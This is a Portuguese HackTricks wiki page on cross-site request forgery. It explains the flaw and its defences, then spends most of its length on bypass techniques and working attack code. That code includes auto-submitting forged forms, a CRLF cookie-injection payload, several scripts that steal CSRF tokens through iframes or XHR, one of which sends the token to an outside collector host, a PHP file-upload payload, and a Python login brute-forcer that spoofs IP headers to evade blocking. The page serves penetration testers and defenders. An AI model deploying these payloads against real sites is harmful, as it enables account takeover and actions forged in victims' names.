# CSRF (Cross Site Request Forgery)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Junte-se ao [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de bugs!

**Insights de Hacking**\
Engaje-se com conte√∫do que explora a emo√ß√£o e os desafios do hacking

**Not√≠cias de Hacking em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking atrav√©s de not√≠cias e insights em tempo real

**√öltimos An√∫ncios**\
Fique informado sobre os novos programas de recompensas por bugs lan√ßados e atualiza√ß√µes cruciais da plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

## Cross-Site Request Forgery (CSRF) Explicado

**Cross-Site Request Forgery (CSRF)** √© um tipo de vulnerabilidade de seguran√ßa encontrada em aplica√ß√µes web. Ela permite que atacantes realizem a√ß√µes em nome de usu√°rios desavisados, explorando suas sess√µes autenticadas. O ataque √© executado quando um usu√°rio, que est√° logado na plataforma de uma v√≠tima, visita um site malicioso. Este site ent√£o aciona requisi√ß√µes para a conta da v√≠tima atrav√©s de m√©todos como executar JavaScript, enviar formul√°rios ou buscar imagens.

### Pr√©-requisitos para um Ataque CSRF

Para explorar uma vulnerabilidade CSRF, v√°rias condi√ß√µes devem ser atendidas:

1. **Identificar uma A√ß√£o Valiosa**: O atacante precisa encontrar uma a√ß√£o que vale a pena explorar, como mudar a senha do usu√°rio, email ou elevar privil√©gios.
2. **Gerenciamento de Sess√£o**: A sess√£o do usu√°rio deve ser gerenciada exclusivamente atrav√©s de cookies ou do cabe√ßalho de Autentica√ß√£o B√°sica HTTP, pois outros cabe√ßalhos n√£o podem ser manipulados para esse prop√≥sito.
3. **Aus√™ncia de Par√¢metros Imprevis√≠veis**: A requisi√ß√£o n√£o deve conter par√¢metros imprevis√≠veis, pois eles podem impedir o ataque.

### Verifica√ß√£o R√°pida

Voc√™ pode **capturar a requisi√ß√£o no Burp** e verificar as prote√ß√µes CSRF e para testar do navegador voc√™ pode clicar em **Copiar como fetch** e verificar a requisi√ß√£o:

<figure><img src="../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

### Defendendo Contra CSRF

V√°rias contramedidas podem ser implementadas para proteger contra ataques CSRF:

* [**Cookies SameSite**](hacking-with-cookies/#samesite): Este atributo impede que o navegador envie cookies junto com requisi√ß√µes de outros sites. [Mais sobre cookies SameSite](hacking-with-cookies/#samesite).
* [**Compartilhamento de recursos entre origens**](cors-bypass.md): A pol√≠tica CORS do site da v√≠tima pode influenciar a viabilidade do ataque, especialmente se o ataque requerer a leitura da resposta do site da v√≠tima. [Saiba mais sobre bypass de CORS](cors-bypass.md).
* **Verifica√ß√£o do Usu√°rio**: Solicitar a senha do usu√°rio ou resolver um captcha pode confirmar a inten√ß√£o do usu√°rio.
* **Verificando Cabe√ßalhos Referrer ou Origin**: Validar esses cabe√ßalhos pode ajudar a garantir que as requisi√ß√µes est√£o vindo de fontes confi√°veis. No entanto, a elabora√ß√£o cuidadosa de URLs pode contornar verifica√ß√µes mal implementadas, como:
* Usar `http://mal.net?orig=http://example.com` (URL termina com a URL confi√°vel)
* Usar `http://example.com.mal.net` (URL come√ßa com a URL confi√°vel)
* **Modificando Nomes de Par√¢metros**: Alterar os nomes dos par√¢metros em requisi√ß√µes POST ou GET pode ajudar a prevenir ataques automatizados.
* **Tokens CSRF**: Incorporar um token CSRF √∫nico em cada sess√£o e exigir esse token em requisi√ß√µes subsequentes pode mitigar significativamente o risco de CSRF. A efic√°cia do token pode ser aumentada pela imposi√ß√£o de CORS.

Compreender e implementar essas defesas √© crucial para manter a seguran√ßa e integridade das aplica√ß√µes web.

## Bypass de Defesas

### De POST para GET

Talvez o formul√°rio que voc√™ deseja abusar esteja preparado para enviar uma **requisi√ß√£o POST com um token CSRF, mas** voc√™ deve **verificar** se um **GET** tamb√©m √© **v√°lido** e se, ao enviar uma requisi√ß√£o GET, o **token CSRF ainda est√° sendo validado**.

### Falta de token

As aplica√ß√µes podem implementar um mecanismo para **validar tokens** quando eles est√£o presentes. No entanto, uma vulnerabilidade surge se a valida√ß√£o for completamente ignorada quando o token est√° ausente. Os atacantes podem explorar isso **removendo o par√¢metro** que carrega o token, n√£o apenas seu valor. Isso permite que eles contornem o processo de valida√ß√£o e realizem um ataque Cross-Site Request Forgery (CSRF) de forma eficaz.

### Token CSRF n√£o est√° vinculado √† sess√£o do usu√°rio

Aplica√ß√µes **que n√£o vinculam tokens CSRF √†s sess√µes de usu√°rio** apresentam um **risco de seguran√ßa** significativo. Esses sistemas verificam tokens contra um **pool global** em vez de garantir que cada token esteja vinculado √† sess√£o iniciadora.

Veja como os atacantes exploram isso:

1. **Autenticar** usando sua pr√≥pria conta.
2. **Obter um token CSRF v√°lido** do pool global.
3. **Usar esse token** em um ataque CSRF contra uma v√≠tima.

Essa vulnerabilidade permite que os atacantes fa√ßam requisi√ß√µes n√£o autorizadas em nome da v√≠tima, explorando o **mecanismo inadequado de valida√ß√£o de tokens** da aplica√ß√£o.

### Bypass de M√©todo

Se a requisi√ß√£o estiver usando um m√©todo "**estranho**", verifique se a **funcionalidade** de **sobrescrita de m√©todo** est√° funcionando. Por exemplo, se estiver **usando um m√©todo PUT**, voc√™ pode tentar **usar um m√©todo POST** e **enviar**: _https://example.com/my/dear/api/val/num?**\_method=PUT**_

Isso tamb√©m pode funcionar enviando o **par√¢metro \_method dentro de uma requisi√ß√£o POST** ou usando os **cabe√ßalhos**:

* _X-HTTP-Method_
* _X-HTTP-Method-Override_
* _X-Method-Override_

### Bypass de token de cabe√ßalho personalizado

Se a requisi√ß√£o estiver adicionando um **cabe√ßalho personalizado** com um **token** √† requisi√ß√£o como **m√©todo de prote√ß√£o CSRF**, ent√£o:

* Teste a requisi√ß√£o sem o **Token Personalizado e tamb√©m o cabe√ßalho.**
* Teste a requisi√ß√£o com o **mesmo comprimento exato, mas um token diferente**.

### Token CSRF √© verificado por um cookie

As aplica√ß√µes podem implementar prote√ß√£o CSRF duplicando o token em um cookie e um par√¢metro de requisi√ß√£o ou configurando um cookie CSRF e verificando se o token enviado no backend corresponde ao cookie. A aplica√ß√£o valida requisi√ß√µes verificando se o token no par√¢metro de requisi√ß√£o alinha-se com o valor no cookie.

No entanto, esse m√©todo √© vulner√°vel a ataques CSRF se o site tiver falhas que permitam a um atacante definir um cookie CSRF no navegador da v√≠tima, como uma vulnerabilidade CRLF. O atacante pode explorar isso carregando uma imagem enganosa que define o cookie, seguida pela inicia√ß√£o do ataque CSRF.

Abaixo est√° um exemplo de como um ataque poderia ser estruturado:
```html
<html>
<!-- CSRF Proof of Concept - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://example.com/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="hidden" name="csrf" value="tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" />
<input type="submit" value="Submit request" />
</form>
<img src="https://example.com/?search=term%0d%0aSet-Cookie:%20csrf=tZqZzQ1tiPj8KFnO4FOAawq7UsYzDk8E" onerror="document.forms[0].submit();"/>
</body>
</html>

```
{% hint style="info" %}
Observe que se o **token csrf estiver relacionado com o cookie de sess√£o, este ataque n√£o funcionar√°** porque voc√™ precisar√° definir a sess√£o da v√≠tima, e, portanto, estar√° atacando a si mesmo.
{% endhint %}

### Mudan√ßa de Content-Type

De acordo com [**isso**](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS#simple\_requests), para **evitar requisi√ß√µes de pr√©-v√¥o** usando o m√©todo **POST**, estes s√£o os valores de Content-Type permitidos:

* **`application/x-www-form-urlencoded`**
* **`multipart/form-data`**
* **`text/plain`**

No entanto, observe que a **l√≥gica do servidor pode variar** dependendo do **Content-Type** utilizado, ent√£o voc√™ deve tentar os valores mencionados e outros como **`application/json`**_**,**_**`text/xml`**, **`application/xml`**_._

Exemplo (de [aqui](https://brycec.me/posts/corctf\_2021\_challenges)) de envio de dados JSON como text/plain:
```html
<html>
<body>
<form id="form" method="post" action="https://phpme.be.ax/" enctype="text/plain">
<input name='{"garbageeeee":"' value='", "yep": "yep yep yep", "url": "https://webhook/"}'>
</form>
<script>
form.submit();
</script>
</body>
</html>
```
### Bypassando Requisi√ß√µes Preflight para Dados JSON

Ao tentar enviar dados JSON via uma requisi√ß√£o POST, usar `Content-Type: application/json` em um formul√°rio HTML n√£o √© diretamente poss√≠vel. Da mesma forma, utilizar `XMLHttpRequest` para enviar esse tipo de conte√∫do inicia uma requisi√ß√£o preflight. No entanto, existem estrat√©gias para potencialmente contornar essa limita√ß√£o e verificar se o servidor processa os dados JSON independentemente do Content-Type:

1. **Use Tipos de Conte√∫do Alternativos**: Empregue `Content-Type: text/plain` ou `Content-Type: application/x-www-form-urlencoded` definindo `enctype="text/plain"` no formul√°rio. Essa abordagem testa se o backend utiliza os dados independentemente do Content-Type.
2. **Modifique o Tipo de Conte√∫do**: Para evitar uma requisi√ß√£o preflight enquanto garante que o servidor reconhe√ßa o conte√∫do como JSON, voc√™ pode enviar os dados com `Content-Type: text/plain; application/json`. Isso n√£o aciona uma requisi√ß√£o preflight, mas pode ser processado corretamente pelo servidor se estiver configurado para aceitar `application/json`.
3. **Utiliza√ß√£o de Arquivo SWF Flash**: Um m√©todo menos comum, mas vi√°vel, envolve usar um arquivo SWF flash para contornar tais restri√ß√µes. Para uma compreens√£o mais profunda dessa t√©cnica, consulte [este post](https://anonymousyogi.medium.com/json-csrf-csrf-that-none-talks-about-c2bf9a480937).

### Bypass de verifica√ß√£o de Referer / Origem

**Evitar o cabe√ßalho Referer**

As aplica√ß√µes podem validar o cabe√ßalho 'Referer' apenas quando ele est√° presente. Para impedir que um navegador envie esse cabe√ßalho, a seguinte tag meta HTML pode ser usada:
```xml
<meta name="referrer" content="never">
```
Isso garante que o cabe√ßalho 'Referer' seja omitido, potencialmente contornando as verifica√ß√µes de valida√ß√£o em algumas aplica√ß√µes.

**Bypasses de Regexp**

{% content-ref url="ssrf-server-side-request-forgery/url-format-bypass.md" %}
[url-format-bypass.md](ssrf-server-side-request-forgery/url-format-bypass.md)
{% endcontent-ref %}

Para definir o nome do dom√≠nio do servidor na URL que o Referrer vai enviar dentro dos par√¢metros, voc√™ pode fazer:
```html
<html>
<!-- Referrer policy needed to send the qury parameter in the referrer -->
<head><meta name="referrer" content="unsafe-url"></head>
<body>
<script>history.pushState('', '', '/')</script>
<form action="https://ac651f671e92bddac04a2b2e008f0069.web-security-academy.net/my-account/change-email" method="POST">
<input type="hidden" name="email" value="asd&#64;asd&#46;asd" />
<input type="submit" value="Submit request" />
</form>
<script>
// You need to set this or the domain won't appear in the query of the referer header
history.pushState("", "", "?ac651f671e92bddac04a2b2e008f0069.web-security-academy.net")
document.forms[0].submit();
</script>
</body>
</html>
```
### **M√©todo HEAD bypass**

A primeira parte de [**este CTF writeup**](https://github.com/google/google-ctf/tree/master/2023/web-vegsoda/solution) explica que o [c√≥digo-fonte do Oak](https://github.com/oakserver/oak/blob/main/router.ts#L281), um roteador, est√° configurado para **tratar requisi√ß√µes HEAD como requisi√ß√µes GET** sem corpo de resposta - uma solu√ß√£o comum que n√£o √© exclusiva do Oak. Em vez de um manipulador espec√≠fico que lida com requisi√ß√µes HEAD, elas s√£o simplesmente **enviadas para o manipulador GET, mas o aplicativo apenas remove o corpo da resposta**.

Portanto, se uma requisi√ß√£o GET estiver sendo limitada, voc√™ pode simplesmente **enviar uma requisi√ß√£o HEAD que ser√° processada como uma requisi√ß√£o GET**.

## **Exemplos de Explora√ß√£o**

### **Exfiltrando o Token CSRF**

Se um **token CSRF** estiver sendo usado como **defesa**, voc√™ pode tentar **exfiltr√°-lo** abusando de uma vulnerabilidade de [**XSS**](xss-cross-site-scripting/#xss-stealing-csrf-tokens) ou uma vulnerabilidade de [**Dangling Markup**](dangling-markup-html-scriptless-injection/).

### **GET usando tags HTML**
```xml
<img src="http://google.es?param=VALUE" style="display:none" />
<h1>404 - Page not found</h1>
The URL you are requesting is no longer available
```
Outras tags HTML5 que podem ser usadas para enviar automaticamente uma solicita√ß√£o GET s√£o:
```html
<iframe src="..."></iframe>
<script src="..."></script>
<img src="..." alt="">
<embed src="...">
<audio src="...">
<video src="...">
<source src="..." type="...">
<video poster="...">
<link rel="stylesheet" href="...">
<object data="...">
<body background="...">
<div style="background: url('...');"></div>
<style>
body { background: url('...'); }
</style>
<bgsound src="...">
<track src="..." kind="subtitles">
<input type="image" src="..." alt="Submit Button">
```
### Formul√°rio de solicita√ß√£o GET
```html
<html>
<!-- CSRF PoC - generated by Burp Suite Professional -->
<body>
<script>history.pushState('', '', '/')</script>
<form method="GET" action="https://victim.net/email/change-email">
<input type="hidden" name="email" value="some@email.com" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### Solicita√ß√£o POST de Formul√°rio
```html
<html>
<body>
<script>history.pushState('', '', '/')</script>
<form method="POST" action="https://victim.net/email/change-email" id="csrfform">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" /> <!-- Way 1 to autosubmit -->
<input type="submit" value="Submit request" />
<img src=x onerror="csrfform.submit();" /> <!-- Way 2 to autosubmit -->
</form>
<script>
document.forms[0].submit(); //Way 3 to autosubmit
</script>
</body>
</html>
```
### Formul√°rio de solicita√ß√£o POST atrav√©s de iframe
```html
<!--
The request is sent through the iframe withuot reloading the page
-->
<html>
<body>
<iframe style="display:none" name="csrfframe"></iframe>
<form method="POST" action="/change-email" id="csrfform" target="csrfframe">
<input type="hidden" name="email" value="some@email.com" autofocus onfocus="csrfform.submit();" />
<input type="submit" value="Submit request" />
</form>
<script>
document.forms[0].submit();
</script>
</body>
</html>
```
### **Requisi√ß√£o POST Ajax**
```html
<script>
var xh;
if (window.XMLHttpRequest)
{// code for IE7+, Firefox, Chrome, Opera, Safari
xh=new XMLHttpRequest();
}
else
{// code for IE6, IE5
xh=new ActiveXObject("Microsoft.XMLHTTP");
}
xh.withCredentials = true;
xh.open("POST","http://challenge01.root-me.org/web-client/ch22/?action=profile");
xh.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'); //to send proper header info (optional, but good to have as it may sometimes not work without this)
xh.send("username=abcd&status=on");
</script>

<script>
//JQuery version
$.ajax({
type: "POST",
url: "https://google.com",
data: "param=value&param2=value2"
})
</script>
```
### multipart/form-data POST request
```javascript
myFormData = new FormData();
var blob = new Blob(["<?php phpinfo(); ?>"], { type: "text/text"});
myFormData.append("newAttachment", blob, "pwned.php");
fetch("http://example/some/path", {
method: "post",
body: myFormData,
credentials: "include",
headers: {"Content-Type": "application/x-www-form-urlencoded"},
mode: "no-cors"
});
```
### multipart/form-data POST request v2
```javascript
// https://www.exploit-db.com/exploits/20009
var fileSize = fileData.length,
boundary = "OWNEDBYOFFSEC",
xhr = new XMLHttpRequest();
xhr.withCredentials = true;
xhr.open("POST", url, true);
//  MIME POST request.
xhr.setRequestHeader("Content-Type", "multipart/form-data, boundary="+boundary);
xhr.setRequestHeader("Content-Length", fileSize);
var body = "--" + boundary + "\r\n";
body += 'Content-Disposition: form-data; name="' + nameVar +'"; filename="' + fileName + '"\r\n';
body += "Content-Type: " + ctype + "\r\n\r\n";
body += fileData + "\r\n";
body += "--" + boundary + "--";

//xhr.send(body);
xhr.sendAsBinary(body);
```
### Solicita√ß√£o POST de formul√°rio de dentro de um iframe
```html
<--! expl.html -->

<body onload="envia()">
<form method="POST"id="formulario" action="http://aplicacion.example.com/cambia_pwd.php">
<input type="text" id="pwd" name="pwd" value="otra nueva">
</form>
<body>
<script>
function envia(){document.getElementById("formulario").submit();}
</script>

<!-- public.html -->
<iframe src="2-1.html" style="position:absolute;top:-5000">
</iframe>
<h1>Sitio bajo mantenimiento. Disculpe las molestias</h1>
```
### **Roubar o Token CSRF e enviar uma solicita√ß√£o POST**
```javascript
function submitFormWithTokenJS(token) {
var xhr = new XMLHttpRequest();
xhr.open("POST", POST_URL, true);
xhr.withCredentials = true;

// Send the proper header information along with the request
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

// This is for debugging and can be removed
xhr.onreadystatechange = function() {
if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
//console.log(xhr.responseText);
}
}

xhr.send("token=" + token + "&otherparama=heyyyy");
}

function getTokenJS() {
var xhr = new XMLHttpRequest();
// This tels it to return it as a HTML document
xhr.responseType = "document";
xhr.withCredentials = true;
// true on the end of here makes the call asynchronous
xhr.open("GET", GET_URL, true);
xhr.onload = function (e) {
if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
// Get the document from the response
page = xhr.response
// Get the input element
input = page.getElementById("token");
// Show the token
//console.log("The token is: " + input.value);
// Use the token to submit the form
submitFormWithTokenJS(input.value);
}
};
// Make the request
xhr.send(null);
}

var GET_URL="http://google.com?param=VALUE"
var POST_URL="http://google.com?param=VALUE"
getTokenJS();
```
### **Roubar o Token CSRF e enviar uma solicita√ß√£o Post usando um iframe, um formul√°rio e Ajax**
```html
<form id="form1" action="http://google.com?param=VALUE" method="post" enctype="multipart/form-data">
<input type="text" name="username" value="AA">
<input type="checkbox" name="status" checked="checked">
<input id="token" type="hidden" name="token" value="" />
</form>

<script type="text/javascript">
function f1(){
x1=document.getElementById("i1");
x1d=(x1.contentWindow||x1.contentDocument);
t=x1d.document.getElementById("token").value;

document.getElementById("token").value=t;
document.getElementById("form1").submit();
}
</script>
<iframe id="i1" style="display:none" src="http://google.com?param=VALUE" onload="javascript:f1();"></iframe>
```
### **Roubar o token CSRF e enviar uma solicita√ß√£o POST usando um iframe e um formul√°rio**
```html
<iframe id="iframe" src="http://google.com?param=VALUE" width="500" height="500" onload="read()"></iframe>

<script>
function read()
{
var name = 'admin2';
var token = document.getElementById("iframe").contentDocument.forms[0].token.value;
document.writeln('<form width="0" height="0" method="post" action="http://www.yoursebsite.com/check.php"  enctype="multipart/form-data">');
document.writeln('<input id="username" type="text" name="username" value="' + name + '" /><br />');
document.writeln('<input id="token" type="hidden" name="token" value="' + token + '" />');
document.writeln('<input type="submit" name="submit" value="Submit" /><br/>');
document.writeln('</form>');
document.forms[0].submit.click();
}
</script>
```
### **Roubar token e envi√°-lo usando 2 iframes**
```html
<script>
var token;
function readframe1(){
token = frame1.document.getElementById("profile").token.value;
document.getElementById("bypass").token.value = token
loadframe2();
}
function loadframe2(){
var test = document.getElementbyId("frame2");
test.src = "http://requestb.in/1g6asbg1?token="+token;
}
</script>

<iframe id="frame1" name="frame1" src="http://google.com?param=VALUE" onload="readframe1()"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>

<iframe id="frame2" name="frame2"
sandbox="allow-same-origin allow-scripts allow-forms allow-popups allow-top-navigation"
height="600" width="800"></iframe>
<body onload="document.forms[0].submit()">
<form id="bypass" name"bypass" method="POST" target="frame2" action="http://google.com?param=VALUE" enctype="multipart/form-data">
<input type="text" name="username" value="z">
<input type="checkbox" name="status" checked="">
<input id="token" type="hidden" name="token" value="0000" />
<button type="submit">Submit</button>
</form>
```
### **POSTRoubar o token CSRF com Ajax e enviar um post com um formul√°rio**
```html
<body onload="getData()">

<form id="form" action="http://google.com?param=VALUE" method="POST" enctype="multipart/form-data">
<input type="hidden" name="username" value="root"/>
<input type="hidden" name="status" value="on"/>
<input type="hidden" id="findtoken" name="token" value=""/>
<input type="submit" value="valider"/>
</form>

<script>
var x = new XMLHttpRequest();
function getData() {
x.withCredentials = true;
x.open("GET","http://google.com?param=VALUE",true);
x.send(null);
}
x.onreadystatechange = function() {
if (x.readyState == XMLHttpRequest.DONE) {
var token = x.responseText.match(/name="token" value="(.+)"/)[1];
document.getElementById("findtoken").value = token;
document.getElementById("form").submit();
}
}
</script>
```
### CSRF com Socket.IO
```html
<script src="https://cdn.jsdelivr.net/npm/socket.io-client@2/dist/socket.io.js"></script>
<script>
let socket = io('http://six.jh2i.com:50022/test');

const username = 'admin'

socket.on('connect', () => {
console.log('connected!');
socket.emit('join', {
room: username
});
socket.emit('my_room_event', {
data: '!flag',
room: username
})

});
</script>
```
## CSRF Login Brute Force

O c√≥digo pode ser usado para for√ßar um formul√°rio de login usando um token CSRF (tamb√©m est√° usando o cabe√ßalho X-Forwarded-For para tentar contornar um poss√≠vel bloqueio de IP):
```python
import request
import re
import random

URL = "http://10.10.10.191/admin/"
PROXY = { "http": "127.0.0.1:8080"}
SESSION_COOKIE_NAME = "BLUDIT-KEY"
USER = "fergus"
PASS_LIST="./words"

def init_session():
#Return CSRF + Session (cookie)
r = requests.get(URL)
csrf = re.search(r'input type="hidden" id="jstokenCSRF" name="tokenCSRF" value="([a-zA-Z0-9]*)"', r.text)
csrf = csrf.group(1)
session_cookie = r.cookies.get(SESSION_COOKIE_NAME)
return csrf, session_cookie

def login(user, password):
print(f"{user}:{password}")
csrf, cookie = init_session()
cookies = {SESSION_COOKIE_NAME: cookie}
data = {
"tokenCSRF": csrf,
"username": user,
"password": password,
"save": ""
}
headers = {
"X-Forwarded-For": f"{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}.{random.randint(1,256)}"
}
r = requests.post(URL, data=data, cookies=cookies, headers=headers, proxies=PROXY)
if "Username or password incorrect" in r.text:
return False
else:
print(f"FOUND {user} : {password}")
return True

with open(PASS_LIST, "r") as f:
for line in f:
login(USER, line.strip())
```
## Ferramentas <a href="#tools" id="tools"></a>

* [https://github.com/0xInfection/XSRFProbe](https://github.com/0xInfection/XSRFProbe)
* [https://github.com/merttasci/csrf-poc-generator](https://github.com/merttasci/csrf-poc-generator)

## Refer√™ncias

* [https://portswigger.net/web-security/csrf](https://portswigger.net/web-security/csrf)
* [https://portswigger.net/web-security/csrf/bypassing-token-validation](https://portswigger.net/web-security/csrf/bypassing-token-validation)
* [https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses](https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses)
* [https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html](https://www.hahwul.com/2019/10/bypass-referer-check-logic-for-csrf.html)

‚Äã

<figure><img src="../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

Junte-se ao [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e ca√ßadores de bugs!

**Insights de Hacking**\
Engaje-se com conte√∫do que explora a emo√ß√£o e os desafios do hacking

**Not√≠cias de Hack em Tempo Real**\
Mantenha-se atualizado com o mundo acelerado do hacking atrav√©s de not√≠cias e insights em tempo real

**√öltimos An√∫ncios**\
Fique informado sobre os novos programas de recompensas por bugs lan√ßados e atualiza√ß√µes cruciais da plataforma

**Junte-se a n√≥s no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
